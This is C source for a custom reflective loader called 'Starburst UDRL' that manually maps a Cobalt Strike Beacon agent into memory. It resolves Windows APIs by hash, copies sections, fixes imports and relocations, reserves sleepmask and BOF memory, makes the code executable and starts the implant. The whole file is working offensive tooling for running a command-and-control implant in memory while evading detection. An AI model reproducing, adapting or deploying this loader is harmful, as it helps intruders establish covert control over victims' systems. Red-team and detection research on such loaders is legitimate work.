#include <Common.h>
#include <Constexpr.h>
#include <UserData.h>

FUNC FILE *__cdecl __acrt_iob_funcs(unsigned index)
{
    STARDUST_INSTANCE
    return &(API( __iob_func )()[index]);
}

#define stdin (__acrt_iob_funcs(0))
#define stdout (__acrt_iob_funcs(1))
#define stderr (__acrt_iob_funcs(2))

FUNC BOOL ResolveApis()
{
    STARDUST_INSTANCE

    MOD( Ntdll ) = LdrModulePeb( H_MODULE_NTDLL );
    MOD( Kernel32 ) = LdrModulePeb( H_MODULE_KERNEL32 );

    RESOLVE( LoadLibraryA, Kernel32 );

    if ( !MOD( Ntdll ) || !MOD( Kernel32 ) || !API( LoadLibraryA ) )
        return FALSE;

    #define DLL_ENTRY(mod) if ( !( MOD( mod ) = API( LoadLibraryA )( #mod ) ) ) return FALSE;
    DLL_LIST
    #undef DLL_ENTRY

    #define API_ENTRY(api, mod) if ( !( RESOLVE( api, mod ) ) ) return FALSE;
    API_LIST
    #undef API_ENTRY

    return TRUE;
}

FUNC VOID Main(
    _In_ PVOID Param
) {
    STARDUST_INSTANCE
    PCUSTOM_DATA            cData               = { 0 };
    PIMAGE_DOS_HEADER       DOS_Beacon          = { 0 };
    PIMAGE_NT_HEADERS       NT_Beacon           = { 0 };
    PIMAGE_SECTION_HEADER   pBeaconSH           = { 0 };
    LPVOID                  pImportDir          = { 0 };
    LPVOID                  pRelocDir           = { 0 };
    PVOID                   pProtect            = { 0 };
    SIZE_T                  szProtect           = { 0 };
    ULONG                   oldProtect          = { 0 };
    UDRL_USER_DATA          udrlData            = { 0 };
    USER_DATA               userData            = { 0 };
    ALLOCATED_MEMORY        allocatedMemory     = { 0 };

    if (!ResolveApis())
        return;

#ifdef DEBUG
    if (API( AllocConsole )())
    {
        HWND cWindows = API( GetConsoleWindow )();
        API( freopen )("CONIN$", "r", stdin);
        API( freopen )("CONOUT$", "w", stderr);
        API( freopen )("CONOUT$", "w", stdout);
        API( ShowWindow )(cWindows, SW_RESTORE);
        API( SetForegroundWindow )(cWindows);
        API( UpdateWindow )(cWindows);
    }
#endif

    PRINT("Starburst UDRL starting...");

    cData = API( calloc )(1, sizeof(CUSTOM_DATA));
    Instance()->cData = cData;
    PRINT("cData: %p", cData);

    // Parse agent PE headers
    DOS_Beacon = PADD( Instance()->Base.Buffer, Instance()->Base.Length );
    NT_Beacon = PADD( DOS_Beacon, DOS_Beacon->e_lfanew );

    // Store agent size and calculate total stomp size
    cData->szBeacon = NT_Beacon->OptionalHeader.SizeOfImage;
    cData->szStomp = cData->szBeacon + SZ_SLEEPMASK + SZ_BOF;

    // Allocate contiguous region: [agent | sleepmask | BOF]
    cData->pStompBeacon = API( VirtualAlloc )(NULL, cData->szStomp, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    cData->pStompSleepmask = PADD( cData->pStompBeacon, cData->szBeacon );
    PRINT("pStompSleepmask: %p", cData->pStompSleepmask);

    cData->pStompBof = PADD( cData->pStompSleepmask, SZ_SLEEPMASK );
    PRINT("pStompBof: %p", cData->pStompBof);

    // Store agent entry point for later
    API( DllMain ) = PADD( cData->pStompBeacon, NT_Beacon->OptionalHeader.AddressOfEntryPoint );

    pBeaconSH = IMAGE_FIRST_SECTION( NT_Beacon );

    // Map agent sections into memory
    for (INT i = 0; i < NT_Beacon->FileHeader.NumberOfSections; i++)
    {
        PRINT("Mapping: %s start: %p end: %p", pBeaconSH[i].Name,
            PADD( cData->pStompBeacon, pBeaconSH[i].VirtualAddress ),
            PADD( cData->pStompBeacon, pBeaconSH[i].VirtualAddress, pBeaconSH[i].Misc.VirtualSize ) );

        // For .text section, calculate exec/RW region boundaries for the sleep mask
        if ( API( strcmp )(pBeaconSH[i].Name, ".text") == 0 )
        {
            cData->pStompBeaconExec = PADD( cData->pStompBeacon, pBeaconSH[i].VirtualAddress );
            cData->szBeaconExec = pBeaconSH[i].Misc.VirtualSize;
            cData->pStompBeaconRw = PADD( cData->pStompBeacon, cData->szBeaconExec );
            cData->szBeaconRw = (SIZE_T) PSUB( cData->pStompSleepmask, PADD( cData->pStompBeacon, cData->szBeaconExec ) );
        }

        MmCopy(PADD( cData->pStompBeacon, pBeaconSH[i].VirtualAddress ), PADD( DOS_Beacon, pBeaconSH[i].PointerToRawData ), pBeaconSH[i].SizeOfRawData);
    }

    // Resolve IAT
    pImportDir = PADD( cData->pStompBeacon, (&NT_Beacon->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT])->VirtualAddress );
    ResolveIAT(cData->pStompBeacon, pImportDir);

    // Process relocations
    pRelocDir = PADD( cData->pStompBeacon, (&NT_Beacon->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC])->VirtualAddress );
    ProcessRelocations(cData->pStompBeacon, C_PTR( NT_Beacon->OptionalHeader.ImageBase), pRelocDir);

    //
    // Transferring Execution (Starburst adaptation)
    //
    // CS equivalent: NtProtectVirtualMemory on .text
    // Identical in Starburst - make .text executable before calling the entry point.
    // We copy the values to local vars because NtProtectVirtualMemory can modify them.
    //
    pProtect = cData->pStompBeaconExec;
    szProtect = cData->szBeaconExec;
    API( NtProtectVirtualMemory )(NtCurrentProcess(), &pProtect, &szProtect, PAGE_EXECUTE_READ, &oldProtect);

    //
    // ── Populate CS USER_DATA (Beacon User Data) ──
    //
    // The agent's internal sleepmask/BOF loading reads USER_DATA + ALLOCATED_MEMORY
    // (from beacon.h) to learn where those regions live. This is passed via
    // DLL_BEACON_USER_DATA - the agent copies it internally.
    //

    userData.version = COBALT_STRIKE_VERSION;

    MmCopy(userData.custom, &cData, sizeof(PVOID));

    userData.allocatedMemory = &allocatedMemory;

    // Sleepmask region
    allocatedMemory.AllocatedMemoryRegions[0].Purpose = PURPOSE_SLEEPMASK_MEMORY;
    allocatedMemory.AllocatedMemoryRegions[0].AllocationBase = cData->pStompSleepmask;
    allocatedMemory.AllocatedMemoryRegions[0].RegionSize = SZ_SLEEPMASK;
    allocatedMemory.AllocatedMemoryRegions[0].Sections[0].Label = LABEL_BUFFER;
    allocatedMemory.AllocatedMemoryRegions[0].Sections[0].BaseAddress = cData->pStompSleepmask;
    allocatedMemory.AllocatedMemoryRegions[0].Sections[0].VirtualSize = SZ_SLEEPMASK;
    allocatedMemory.AllocatedMemoryRegions[0].Sections[0].CurrentProtect = PAGE_READWRITE;

    // BOF region
    allocatedMemory.AllocatedMemoryRegions[1].Purpose = PURPOSE_BOF_MEMORY;
    allocatedMemory.AllocatedMemoryRegions[1].AllocationBase = cData->pStompBof;
    allocatedMemory.AllocatedMemoryRegions[1].RegionSize = SZ_BOF;
    allocatedMemory.AllocatedMemoryRegions[1].Sections[0].Label = LABEL_BUFFER;
    allocatedMemory.AllocatedMemoryRegions[1].Sections[0].BaseAddress = cData->pStompBof;
    allocatedMemory.AllocatedMemoryRegions[1].Sections[0].VirtualSize = SZ_BOF;
    allocatedMemory.AllocatedMemoryRegions[1].Sections[0].CurrentProtect = PAGE_READWRITE;

    // Send BUD to agent - agent copies this internally
    API( DllMain )(0, DLL_BEACON_USER_DATA, &userData);

    //
    // ── Populate UDRL_USER_DATA ──
    //
    // Starburst's own bridge struct for the sleep mask. Passed as lpvReserved
    // in DLL_PROCESS_ATTACH so the sleep mask can access granular region info.
    //

    udrlData.magic   = UDRL_MAGIC;
    udrlData.version = STARBURST_VERSION;

    MmCopy(udrlData.custom, &cData, sizeof(PVOID));

    udrlData.agent_base  = cData->pStompBeacon;
    udrlData.agent_size  = cData->szBeacon;
    udrlData.loader_base = Instance()->Base.Buffer;
    udrlData.loader_size = Instance()->Base.Length;

    // Region 0: Agent image
    udrlData.regions[0].purpose    = UDRL_PURPOSE_AGENT_IMAGE;
    udrlData.regions[0].alloc_base = cData->pStompBeacon;
    udrlData.regions[0].region_size = cData->szBeacon;

    udrlData.regions[0].sections[0].label   = UDRL_LABEL_TEXT;
    udrlData.regions[0].sections[0].base    = cData->pStompBeaconExec;
    udrlData.regions[0].sections[0].size    = cData->szBeaconExec;
    udrlData.regions[0].sections[0].protect = PAGE_EXECUTE_READ;

    udrlData.regions[0].sections[1].label   = UDRL_LABEL_DATA;
    udrlData.regions[0].sections[1].base    = cData->pStompBeaconRw;
    udrlData.regions[0].sections[1].size    = cData->szBeaconRw;
    udrlData.regions[0].sections[1].protect = PAGE_READWRITE;

    udrlData.regions[0].section_count = 2;

    // Region 1: Sleepmask memory
    udrlData.regions[1].purpose    = UDRL_PURPOSE_SLEEPMASK_MEMORY;
    udrlData.regions[1].alloc_base = cData->pStompSleepmask;
    udrlData.regions[1].region_size = SZ_SLEEPMASK;

    udrlData.regions[1].sections[0].label   = UDRL_LABEL_BUFFER;
    udrlData.regions[1].sections[0].base    = cData->pStompSleepmask;
    udrlData.regions[1].sections[0].size    = SZ_SLEEPMASK;
    udrlData.regions[1].sections[0].protect = PAGE_READWRITE;

    udrlData.regions[1].section_count = 1;

    // Region 2: BOF memory
    udrlData.regions[2].purpose    = UDRL_PURPOSE_BOF_MEMORY;
    udrlData.regions[2].alloc_base = cData->pStompBof;
    udrlData.regions[2].region_size = SZ_BOF;

    udrlData.regions[2].sections[0].label   = UDRL_LABEL_BUFFER;
    udrlData.regions[2].sections[0].base    = cData->pStompBof;
    udrlData.regions[2].sections[0].size    = SZ_BOF;
    udrlData.regions[2].sections[0].protect = PAGE_READWRITE;

    udrlData.regions[2].section_count = 1;

    udrlData.region_count = 3;

    PRINT("UDRL_USER_DATA: magic=%llx version=%x regions=%d",
        udrlData.magic, udrlData.version, udrlData.region_count);

    // ── Transfer execution ──

    API( NtFlushInstructionCache )((HANDLE)-1, NULL, 0);

    // DLL_PROCESS_ATTACH - agent initializes, receives UDRL_USER_DATA as lpvReserved
    API( DllMain )(cData->pStompBeacon, DLL_PROCESS_ATTACH, &udrlData);

    // DLL_BEACON_START - agent begins operation
    PRINTB("Calling agent entry!");
    API( DllMain )(StRipStart(), DLL_BEACON_START, NULL);
}
